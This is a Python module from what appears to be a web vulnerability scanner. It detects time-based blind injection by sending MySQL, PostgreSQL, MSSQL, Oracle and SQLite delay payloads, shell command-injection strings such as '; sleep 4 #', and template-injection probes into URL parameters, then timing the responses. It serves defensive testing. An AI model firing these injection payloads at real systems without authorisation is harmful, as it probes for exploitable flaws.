"""Time-based blind injection detection.

Measures response latency before and after injecting SLEEP/DELAY payloads.
Works across SQLi (SLEEP, pg_sleep, WAITFOR DELAY), command injection (sleep,
timeout), and template injection (Java Thread.sleep, Python time.sleep).

Uses baseline calibration: first measures 3 normal requests to establish
expected latency, then compares each payload's rounded latency to the
baseline.  Only triggers when delta >= 2.0× baseline (strong signal),
not just noise.
"""
import time
import asyncio
import httpx
from modules.scanner.base_check import BaseCheck, CheckResult
from urllib.parse import urlparse, parse_qsl, urlencode

# (payload, category, description)
TIME_PAYLOADS: list[tuple[str, str, str]] = [
    # SQL — MySQL
    ("1' AND SLEEP(4)--", "sqli-mysql", "MySQL SLEEP(4)"),
    ("1 AND SLEEP(4)--", "sqli-mysql", "MySQL SLEEP(4) numeric"),
    ("1' OR SLEEP(4)='", "sqli-mysql", "MySQL SLEEP(4) OR"),
    # SQL — PostgreSQL
    ("1; SELECT pg_sleep(4)--", "sqli-postgres", "PostgreSQL pg_sleep(4)"),
    ("1' OR pg_sleep(4)='", "sqli-postgres", "PostgreSQL pg_sleep(4) OR"),
    # SQL — MSSQL
    ("1; WAITFOR DELAY '00:00:04'--", "sqli-mssql", "MSSQL WAITFOR DELAY"),
    ("1'; WAITFOR DELAY '00:00:04'--", "sqli-mssql", "MSSQL WAITFOR DELAY string"),
    # SQL — Oracle
    ("1' AND DBMS_LOCK.SLEEP(4)=1--", "sqli-oracle", "Oracle DBMS_LOCK.SLEEP"),
    # SQL — SQLite
    ("1' AND RANDOMBLOB(200000000)='x", "sqli-sqlite", "SQLite heavy operation"),
    # Command injection
    ("; sleep 4 #", "cmdi", "Unix sleep"),
    ("| sleep 4 #", "cmdi", "Unix sleep pipe"),
    ("`sleep 4`", "cmdi", "Unix sleep backtick"),
    ("& timeout /t 4 > nul &", "cmdi", "Windows timeout"),
    # Template injection
    ("${sleep(4)}", "ssti-java", "Java EL sleep"),
    ("{{sleep(4)}}", "ssti-twig", "Twig sleep"),
]


class ActiveTimeBlindCheck(BaseCheck):
    """Time-based blind injection — SQLi, CMDi, SSTI."""

    name = "active_time_blind"

    async def run(self, base_request: dict, target_params: list[str]) -> list[CheckResult]:
        results: list[CheckResult] = []

        async with httpx.AsyncClient(verify=False, timeout=20) as client:
            # ── Baseline: measure normal latency (3 samples) ──────────
            baseline = await self._measure_baseline(client, base_request)
            if baseline is None:
                return results  # Target unreachable

            for param in target_params:
                for payload, category, desc in TIME_PAYLOADS:
                    try:
                        elapsed = await self._time_request(client, base_request, param, payload)
                        if elapsed is None:
                            continue
                        ratio = elapsed / baseline if baseline > 0 else 999
                        # Strong signal: 2× baseline AND at least 3 seconds
                        if ratio >= 2.0 and elapsed >= 3.0:
                            # Select severity: SQLi = critical, rest = high
                            sev = "critical" if "sqli" in category else "high"
                            results.append(CheckResult(
                                triggered=True,
                                severity=sev,
                                title=f"Time-based blind injection ({category})",
                                description=(
                                    f"Parameter '{param}' caused a {elapsed:.1f}s delay "
                                    f"(baseline: {baseline:.1f}s, ratio: {ratio:.1f}×). "
                                    f"Consistent with time-based {category} injection."
                                ),
                                evidence=(
                                    f"Payload: {payload} ({desc})\n"
                                    f"Response time: {elapsed:.2f}s\n"
                                    f"Baseline: {baseline:.2f}s\n"
                                    f"Ratio: {ratio:.1f}×"
                                ),
                                remediation=(
                                    "Use parameterized queries / prepared statements. "
                                    "Validate and sanitize all user input."
                                ),
                                cwe="CWE-89" if "sqli" in category else "CWE-78",
                            ))
                            break  # Found one for this param, move to next param
                    except Exception:
                        continue

        return results

    async def _measure_baseline(self, client: httpx.AsyncClient, base: dict) -> float | None:
        """Measure 3 baseline requests, return median latency."""
        latencies: list[float] = []
        for _ in range(3):
            try:
                t0 = time.monotonic()
                await client.request(**base)
                latencies.append(time.monotonic() - t0)
            except Exception:
                return None
            await asyncio.sleep(0.15)  # avoid rate limiting
        if not latencies:
            return None
        latencies.sort()
        return latencies[len(latencies) // 2]  # median

    async def _time_request(
        self, client: httpx.AsyncClient, base: dict, param: str, payload: str
    ) -> float | None:
        """Inject payload and return response latency in seconds."""
        import copy
        req = copy.deepcopy(base)
        parsed = urlparse(req["url"])
        params = dict(parse_qsl(parsed.query))
        if param not in params:
            return None
        params[param] = payload
        req["url"] = parsed._replace(query=urlencode(params)).geturl()

        t0 = time.monotonic()
        try:
            await asyncio.wait_for(client.request(**req), timeout=15)
        except (httpx.TimeoutException, asyncio.TimeoutError):
            # Timeout is a valid signal — payload caused ≥15s delay
            return 15.0
        except Exception:
            return None
        return time.monotonic() - t0